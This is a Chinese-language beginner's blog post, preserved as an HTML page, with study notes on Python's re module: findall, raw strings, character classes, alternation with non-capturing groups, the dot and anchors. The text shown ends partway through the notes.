<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Python 正则式学习笔记 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Python 正则式学习笔记" />
<meta property="og:description" content="1． Python正则式的基本用法
1.1基本规则
1.2重复
1.2.1最小匹配与精确匹配
1.3前向界定与后向界定
1.4组的基本知识
2． re模块的基本函数
2.1使用compile加速
2.2 match和search
2.3 finditer
2.4 字符串的修改与替换
3． 更深入的了解re的组与对象
3.1编译后的Pattern对象
3.2 组与Match对象
3.2.1组的名字与序号
3.2.2 Match对象的方法
4． 更多的资料
初学Python，对Python的文字处理能力有很深的印象，除了str对象自带的一些方法外，就是正则表达式这个强大的模块了。但是对于初学者来说，要用好这个功能还是有点难度，我花了好长时间才摸出了点门道。由于我记性不好，很容易就忘事，所以还是写下来比较好一些，同时也可以加深印象，整理思路。
由于我是初学，所以肯定会有些错误，还望高手不吝赐教，指出我的错误。
1 Python正则式的基本用法
Python的正则表达式的模块是 ‘re’,它的基本语法规则就是指定一个字符序列，比如你要在一个字符串s=’123abc456’ 中查找字符串 ’abc’,只要这样写：
&gt;&gt;&gt; import re
&gt;&gt;&gt; s=&#39;123abc456eabc789&#39;
&gt;&gt;&gt; re.findall(r’abc’,s)
结果就是：
[&#39;abc&#39;, &#39;abc&#39;] 这里用到的函数 ”findall(rule , target [,flag] )” 是个比较直观的函数，就是在目标字符串中查找符合规则的字符串。第一个参数是规则，第二个参数是目标字符串，后面还可以跟一个规则选项（选项功能将在compile函数的说明中详细说明）。返回结果结果是一个列表，中间存放的是符合规则的字符串。如果没有符合规则的字符串被找到，就返回一个空列表。
为什么要用r’ ..‘字符串（raw字符串）？ 由于正则式的规则也是由一个字符串定义的，而在正则式中大量使用转义字符’\’，如果不用raw字符串，则在需要写一个’\’的地方，你必须得写成’\\’,那么在要从目标字符串中匹配一个’\’的时候，你就得写上4个’\’成为’\\\\’！这当然很麻烦，也不直观，所以一般都使用r’’来定义规则字符串。当然，某些情况下，可能不用raw字符串比较好。
以上是个最简单的例子。当然实际中这么简单的用法几乎没有意义。为了实现复杂的规则查找，re规定了若干语法规则。它们分为这么几类：
功能字符 ： ‘.’ ‘*’ ‘&#43;’ ‘|’ ‘?’ ‘^’ ‘$’ ‘\’ 等，它们有特殊的功能含义。特别是’/’字符，它是转义引导符号，跟在它后面的字符一般有特殊的含义。
规则分界符： ‘[‘ ‘]’ ‘（’ ‘）’ ‘{‘ ‘}’ 等，也就是几种括号了。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/54c612e1ad50771d6e4b9ffe3565070b/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2008-01-02T21:11:00+08:00" />
<meta property="article:modified_time" content="2008-01-02T21:11:00+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Python 正则式学习笔记</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p class="MsoNormal" style="margin:7.8pt 0cm 7.8pt 18pt; text-indent:-18pt"><span style="font-family:Times New Roman"><span lang="EN-US" style=""><span style=""><span style="font-size:16px">1．</span><span style="font:7pt 'Times New Roman'">  </span></span></span><span lang="EN-US" style=""><span style="font-size:16px">Python</span></span></span><span style="font-size:16px"><span style="font-family:宋体">正则式的基本用法</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:7.8pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US" style=""><span style="font-family:Times New Roman">1.1</span></span><span style="font-family:宋体">基本规则</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:7.8pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US" style=""><span style="font-family:Times New Roman">1.2</span></span><span style="font-family:宋体">重复</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:7.8pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US" style=""><span style="font-family:Times New Roman">1.2.1</span></span><span style="font-family:宋体">最小匹配与精确匹配</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:7.8pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US" style=""><span style="font-family:Times New Roman">1.3</span></span><span style="font-family:宋体">前向界定与后向界定</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:7.8pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US" style=""><span style="font-family:Times New Roman">1.4</span></span><span style="font-family:宋体">组的基本知识</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:7.8pt 0cm 7.8pt 18pt; text-indent:-18pt"><span style="font-family:Times New Roman"><span lang="EN-US" style=""><span style=""><span style="font-size:16px">2．</span><span style="font:7pt 'Times New Roman'">  </span></span></span><span lang="EN-US" style=""><span style="font-size:16px">re</span></span></span><span style="font-size:16px"><span style="font-family:宋体">模块的基本函数</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:7.8pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US" style=""><span style="font-family:Times New Roman">2.1</span></span><span style="font-family:宋体">使用</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">compile</span></span><span style="font-family:宋体">加速</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:7.8pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US" style=""><span style="font-family:Times New Roman">2.2 match</span></span><span style="font-family:宋体">和</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">search</span></span></span></p> 
<p class="MsoNormal" style="margin:7.8pt 0cm; text-indent:17.95pt"><span lang="EN-US" style=""><span style="font-size:16px"><span style="font-family:Times New Roman">2.3 finditer</span></span></span></p> 
<p class="MsoNormal" style="margin:7.8pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US" style=""><span style="font-family:Times New Roman">2.4 </span></span><span style="font-family:宋体">字符串的修改与替换</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:7.8pt 0cm 7.8pt 18pt; text-indent:-18pt"><span lang="EN-US" style=""><span style=""><span style="font-family:Times New Roman"><span style="font-size:16px">3．</span><span style="font:7pt 'Times New Roman'">  </span></span></span></span><span style="font-size:16px"><span style="font-family:宋体">更深入的了解</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">re</span></span><span style="font-family:宋体">的组与对象</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:7.8pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US" style=""><span style="font-family:Times New Roman">3.1</span></span><span style="font-family:宋体">编译后的</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">Pattern</span></span><span style="font-family:宋体">对象</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:7.8pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US" style=""><span style="font-family:Times New Roman">3.2 </span></span><span style="font-family:宋体">组与</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">Match</span></span><span style="font-family:宋体">对象</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:7.8pt 0cm; text-indent:35.9pt"><span style="font-size:16px"><span lang="EN-US" style=""><span style="font-family:Times New Roman">3.2.1</span></span><span style="font-family:宋体">组的名字与序号</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:7.8pt 0cm; text-indent:35.9pt"><span style="font-size:16px"><span style="font-family:Times New Roman"><span lang="EN-US" style="">3.2.2</span><span lang="EN-US" style=""> Match</span></span><span style="font-family:宋体">对象的方法</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:7.8pt 0cm 7.8pt 18pt; text-indent:-18pt"><span lang="EN-US" style=""><span style=""><span style="font-family:Times New Roman"><span style="font-size:16px">4．</span><span style="font:7pt 'Times New Roman'">  </span></span></span></span><span style="font-size:16px"><span style="font-family:宋体">更多的资料</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:7.8pt 0cm; text-indent:21pt"><span style="font-family:Arial"><span style="font-size:16px"> </span></span></p> 
<span style="font-family:Arial; font-size:10.5pt"><br style="page-break-before:always"> </span> 
<p class="MsoNormal" style="margin:7.8pt 0cm; text-indent:21pt"><span style="font-size:16px"><span style="font-family:宋体">初学</span><span style="font-family:Arial">Python</span><span style="font-family:宋体">，对</span><span style="font-family:Arial">Python</span><span style="font-family:宋体">的文字处理能力有很深的印象，除了</span><span style="font-family:Arial">str</span><span style="font-family:宋体">对象自带的一些方法外，就是正则表达式这个强大的模块了。但是对于初学者来说，要用好这个功能还是有点难度，我花了好长时间才摸出了点门道。由于我记性不好，很容易就忘事，所以还是写下来比较好一些，同时也可以加深印象，整理思路。</span><span style="font-family:Arial"></span></span></p> 
<p class="MsoNormal" style="margin:7.8pt 0cm; text-indent:21pt"><span style="font-size:16px"><span style="font-family:宋体">由于我是初学，所以肯定会有些错误，还望高手不吝赐教，指出我的错误。</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:7.8pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US" style=""><span style="font-family:Times New Roman">1 Python</span></span><span style="font-family:宋体">正则式的基本用法</span><span lang="EN-US" style=""></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">的正则表达式的模块是</span><span style="font-family:Times New Roman"> <span lang="EN-US">‘re’,</span></span><span style="font-family:宋体">它的基本语法规则就是指定一个字符序列，比如你要在一个字符串</span><span lang="EN-US"><span style="font-family:Times New Roman">s=’123abc456’ </span></span><span style="font-family:宋体">中查找字符串</span><span style="font-family:Times New Roman"> <span lang="EN-US">’abc’,</span></span><span style="font-family:宋体">只要这样写：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; import re</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; s='123abc456eabc789'</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.findall(r’abc’,s)</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">结果就是：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['abc', 'abc'] </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">这里用到的函数</span><span style="font-family:Times New Roman"> <span lang="EN-US">”findall(rule , target [,flag] )” </span></span><span style="font-family:宋体">是个比较直观的函数，就是在目标字符串中查找符合规则的字符串。第一个参数是规则，第二个参数是目标字符串，后面还可以跟一个规则选项（选项功能将在</span><span lang="EN-US"><span style="font-family:Times New Roman">compile</span></span><span style="font-family:宋体">函数的说明中详细说明）。返回结果结果是一个<strong style="">列表，</strong>中间存放的是符合规则的字符串。如果没有符合规则的字符串被找到，就返回一个<strong style="">空</strong>列表。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:15.45pt"><strong style=""><span style="font-family:宋体; font-size:9pt">为什么要用</span><span lang="EN-US" style="font-size:9pt"><span style="font-family:Times New Roman">r’ ..‘</span></span><span style="font-family:宋体; font-size:9pt">字符串（</span><span lang="EN-US" style="font-size:9pt"><span style="font-family:Times New Roman">raw</span></span><span style="font-family:宋体; font-size:9pt">字符串）？</span><span style="font-size:9pt"><span style="font-family:Times New Roman"> </span></span><span style="font-family:宋体; font-size:9pt">由于正则式的规则也是由一个字符串定义的，而在正则式中大量使用转义字符</span><span lang="EN-US" style="font-size:9pt"><span style="font-family:Times New Roman">’\’</span></span><span style="font-family:宋体; font-size:9pt">，如果不用</span><span lang="EN-US" style="font-size:9pt"><span style="font-family:Times New Roman">raw</span></span><span style="font-family:宋体; font-size:9pt">字符串，则在需要写一个</span><span lang="EN-US" style="font-size:9pt"><span style="font-family:Times New Roman">’\’</span></span><span style="font-family:宋体; font-size:9pt">的地方，你必须得写成</span><span lang="EN-US" style="font-size:9pt"><span style="font-family:Times New Roman">’\\’,</span></span><span style="font-family:宋体; font-size:9pt">那么在要从目标字符串中匹配一个</span><span lang="EN-US" style="font-size:9pt"><span style="font-family:Times New Roman">’\’</span></span><span style="font-family:宋体; font-size:9pt">的时候，你就得写上</span><span lang="EN-US" style="font-size:9pt"><span style="font-family:Times New Roman">4</span></span><span style="font-family:宋体; font-size:9pt">个</span><span lang="EN-US" style="font-size:9pt"><span style="font-family:Times New Roman">’\’</span></span><span style="font-family:宋体; font-size:9pt">成为</span><span lang="EN-US" style="font-size:9pt"><span style="font-family:Times New Roman">’\\\\’</span></span><span style="font-family:宋体; font-size:9pt">！这当然很麻烦，也不直观，所以一般都使用</span><span lang="EN-US" style="font-size:9pt"><span style="font-family:Times New Roman">r’’</span></span><span style="font-family:宋体; font-size:9pt">来定义规则字符串。当然，某些情况下，可能不用</span><span lang="EN-US" style="font-size:9pt"><span style="font-family:Times New Roman">raw</span></span><span style="font-family:宋体; font-size:9pt">字符串比较好。</span><span lang="EN-US" style="font-size:9pt"></span></strong></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:15.45pt"><strong style=""><span lang="EN-US" style="font-size:9pt"><span style="font-family:Times New Roman"> </span></span></strong></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">以上是个最简单的例子。当然实际中这么简单的用法几乎没有意义。为了实现复杂的规则查找，</span><span lang="EN-US"><span style="font-family:Times New Roman">re</span></span><span style="font-family:宋体">规定了若干语法规则。它们分为这么几类：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">功能字符</span><span lang="EN-US"><span style=""><span style="font-family:Times New Roman"> </span></span></span><span style="font-family:宋体">：</span><span lang="EN-US"><span style="font-family:Times New Roman"><span style="">    </span>‘.’ ‘*’ ‘+’ ‘|’ ‘?’ ‘^’ ‘$’ ‘\’ </span></span><span style="font-family:宋体">等，它们有特殊的功能含义。特别是</span><span lang="EN-US"><span style="font-family:Times New Roman">’/’</span></span><span style="font-family:宋体">字符，它是转义引导符号，跟在它后面的字符一般有特殊的含义。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">规则分界符：</span><span lang="EN-US"><span style="font-family:Times New Roman"><span style=""> </span>‘[‘ ‘]’ ‘</span></span><span style="font-family:宋体">（</span><span lang="EN-US"><span style="font-family:Times New Roman">’ ‘</span></span><span style="font-family:宋体">）</span><span lang="EN-US"><span style="font-family:Times New Roman">’ ‘{‘ ‘}’ </span></span><span style="font-family:宋体">等，也就是几种括号了。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">预定义转义字符集：</span><span style="font-family:Times New Roman"> <span lang="EN-US">“\d”<span style="">  </span>“\w” “\s” </span></span><span style="font-family:宋体">等等，它们是以字符</span><span lang="EN-US"><span style="font-family:Times New Roman">’\’</span></span><span style="font-family:宋体">开头，后面接一个特定字符的形式，用来指示一个预定义好的含义。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">其它特殊功能字符：</span><span style="font-family:Times New Roman"> <span lang="EN-US">’#’ ‘!’ ‘:’ ‘-‘</span></span><span style="font-family:宋体">等，它们只在特定的情况下表示特殊的含义，比如</span><span lang="EN-US"><span style="font-family:Times New Roman">(?# …)</span></span><span style="font-family:宋体">就表示一个注释，里面的内容会被忽略。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">下面来一个一个的说明这些规则的含义，不过说明的顺序并不是按照上面的顺序来的，而是我认为由浅入深，由基本到复杂的顺序来编排的。同时为了直观，在说明的过程中尽量多举些例子以方便理解。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">1.1 </span></span><span style="font-family:宋体">基本规则</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></strong></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘[‘<span style="">  </span>‘]’ </span></span><span style="font-family:宋体">字符集合设定符</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">首先说明一下字符集合设定的方法。由一对方括号括起来的字符，表明一个字符集合，能够匹配包含在其中的任意一个字符。比如</span><span lang="EN-US"><span style="font-family:Times New Roman"> [abc123]</span></span><span style="font-family:宋体">，表明字符</span><span lang="EN-US"><span style="font-family:Times New Roman">’a’ ‘b’ ‘c’ ‘1’ ‘2’ ‘3’</span></span><span style="font-family:宋体">都符合它的要求。可以被匹配。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">在</span><span lang="EN-US"><span style="font-family:Times New Roman">’[‘ ‘]’</span></span><span style="font-family:宋体">中还可以通过</span><span style="font-family:Times New Roman"> <span lang="EN-US">’-‘ </span></span><span style="font-family:宋体">减号来指定一个字符集合的范围，比如可以用</span><span lang="EN-US"><span style="font-family:Times New Roman">[a-zA-Z]</span></span><span style="font-family:宋体">来指定所以英文字母的大小写，因为英文字母是按照从小到大的顺序来排的。你不可以把大小的顺序颠倒了，比如写成</span><span lang="EN-US"><span style="font-family:Times New Roman">[z-a]</span></span><span style="font-family:宋体">就不对了。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">如果在</span><span lang="EN-US"><span style="font-family:Times New Roman">’[‘ ‘]’</span></span><span style="font-family:宋体">里面的开头写一个</span><span style="font-family:Times New Roman"> <span lang="EN-US">‘^’ </span></span><span style="font-family:宋体">号，则表示取非，即在括号里的字符都不匹配。如</span><span lang="EN-US"><span style="font-family:Times New Roman">[^a-zA-Z]</span></span><span style="font-family:宋体">表明不匹配所有英文字母。但是如果</span><span style="font-family:Times New Roman"> <span lang="EN-US">‘^’</span></span><span style="font-family:宋体">不在开头，则它就不再是表示取非，而表示其本身，如</span><span lang="EN-US"><span style="font-family:Times New Roman">[a-z^A-Z]</span></span><span style="font-family:宋体">表明匹配所有的英文字母和字符</span><span lang="EN-US"><span style="font-family:Times New Roman">’^’</span></span><span style="font-family:宋体">。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘|’<span style="">    </span></span></span><span style="font-family:宋体">或规则</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">将两个规则并列起来，以‘</span><span lang="EN-US"><span style="font-family:Times New Roman">|</span></span><span style="font-family:宋体">’连接，表示只要满足其中之一就可以匹配。比如</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">[a-zA-Z]|[0-9] </span></span><span style="font-family:宋体">表示满足数字或字母就可以匹配，这个规则等价于</span><span lang="EN-US"><span style="font-family:Times New Roman"> [a-zA-Z0-9]</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:18pt"><span style="font-size:16px"><strong style=""><span style="font-family:宋体">注意</span></strong><span style="font-family:宋体">：关于</span><span lang="EN-US"><span style="font-family:Times New Roman">’|’</span></span><span style="font-family:宋体">要注意两点：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm 2.5pt 65.95pt; text-indent:-48pt"><span lang="EN-US" style=""><span style=""><span style="font-family:Times New Roman"><span style="font-size:16px">第一，</span><span style="font:7pt 'Times New Roman'">           </span></span></span></span><span style="font-size:16px"><span style="font-family:宋体">它在</span><span lang="EN-US"><span style="font-family:Times New Roman">’[‘ ‘]’</span></span><span style="font-family:宋体">之中不再表示或，而表示他本身的字符。如果要在</span><span lang="EN-US"><span style="font-family:Times New Roman">’[‘ ‘]’</span></span><span style="font-family:宋体">外面表示一个</span><span lang="EN-US"><span style="font-family:Times New Roman">’|’</span></span><span style="font-family:宋体">字符，必须用反斜杠引导，即</span><span style="font-family:Times New Roman"> <span lang="EN-US">’/|’ ; </span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm 2.5pt 65.95pt; text-indent:-48pt"><span lang="EN-US" style=""><span style=""><span style="font-family:Times New Roman"><span style="font-size:16px">第二，</span><span style="font:7pt 'Times New Roman'">           </span></span></span></span><span style="font-size:16px"><span style="font-family:宋体">它的有效范围是它两边的整条规则，比如‘</span><span lang="EN-US"><span style="font-family:Times New Roman">dog|cat’</span></span><span style="font-family:宋体">匹配的是‘</span><span lang="EN-US"><span style="font-family:Times New Roman">dog’</span></span><span style="font-family:宋体">和</span><span lang="EN-US"><span style="font-family:Times New Roman">’cat’</span></span><span style="font-family:宋体">，而不是</span><span lang="EN-US"><span style="font-family:Times New Roman">’g’</span></span><span style="font-family:宋体">和</span><span lang="EN-US"><span style="font-family:Times New Roman">’c’</span></span><span style="font-family:宋体">。如果想限定它的有效范围，必需使用一个无捕获组</span><span style="font-family:Times New Roman"> <span lang="EN-US">‘(?: )’</span></span><span style="font-family:宋体">包起来。比如要匹配</span><span style="font-family:Times New Roman"> </span><span style="font-family:宋体">‘</span><span lang="EN-US"><span style="font-family:Times New Roman">I have a dog’</span></span><span style="font-family:宋体">或</span><span lang="EN-US"><span style="font-family:Times New Roman">’I have a cat’</span></span><span style="font-family:宋体">，需要写成</span><span lang="EN-US"><span style="font-family:Times New Roman">r’I have a (?:dog|cat)’ </span></span><span style="font-family:宋体">，而不能写成</span><span lang="EN-US"><span style="font-family:Times New Roman"> r’I have a dog|cat’</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">例</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; s = ‘I have a dog , I have a cat’</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.findall( r’I have a (?:dog|cat)’ , s )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">['I have a dog', 'I have a cat']<span style="">                </span>#</span></span><span style="font-family:宋体">正如我们所要的</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">下面再看看不用无捕获组会是什么后果：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.findall( r’I have a dog|cat’ , s )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">['I have a dog', 'cat']<span style="">                                   </span>#</span></span><span style="font-family:宋体">它将</span><span lang="EN-US"><span style="font-family:Times New Roman">’I have a dog’ </span></span><span style="font-family:宋体">和</span><span lang="EN-US"><span style="font-family:Times New Roman">’cat’</span></span><span style="font-family:宋体">当成两个规则了</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">至于无捕获组的使用，后面将仔细说明。这里先跳过。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘.’<span style="">    </span></span></span><span style="font-family:宋体">匹配所有字符</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">匹配除换行符</span><span lang="EN-US"><span style="font-family:Times New Roman">’\n’</span></span><span style="font-family:宋体">外的所有字符。如果使用了</span><span lang="EN-US"><span style="font-family:Times New Roman">’S’</span></span><span style="font-family:宋体">选项，匹配包括</span><span lang="EN-US"><span style="font-family:Times New Roman">’\n’</span></span><span style="font-family:宋体">的所有字符。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><span lang="EN-US"><span style=""><span style="font-family:Times New Roman">       </span></span></span><span style="font-family:宋体">例：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman"><span style="">       </span>&gt;&gt;&gt; s=’123 \n456 \n789’</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman"><span style="">       </span>&gt;&gt;&gt; findall(r‘.+’,s)</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman"><span style="">       </span>['123', '456', '789']</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman"><span style="">       </span>&gt;&gt;&gt; re.findall(r‘.+’ , s , re.S)</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span lang="EN-US"><span style="font-size:16px"><span style="font-family:Times New Roman"><span style="">       </span>['123\n456\n789']</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘^’</span></span><span style="font-family:宋体">和</span><span lang="EN-US"><span style="font-family:Times New Roman">’$’ </span></span><span style="font-family:宋体">匹配字符串开头和结尾</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">注意</span><span lang="EN-US"><span style="font-family:Times New Roman">’^’</span></span><span style="font-family:宋体">不能在‘</span><span lang="EN-US"><span style="font-family:Times New Roman">[ ]</span></span><span style="font-family:宋体">’中，否则含意就发生变化，具体请看上面的</span><span lang="EN-US"><span style="font-family:Times New Roman">’[‘ ‘]’</span></span><span style="font-family:宋体">说明。</span><span style="font-family:Times New Roman"> </span><span style="font-family:宋体">在多行模式下，它们可以匹配每一行的行首和行尾。具体请看后面</span><span lang="EN-US"><span style="font-family:Times New Roman">compile</span></span><span style="font-family:宋体">函数说明的</span><span lang="EN-US"><span style="font-family:Times New Roman">’M’</span></span><span style="font-family:宋体">选项部分</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
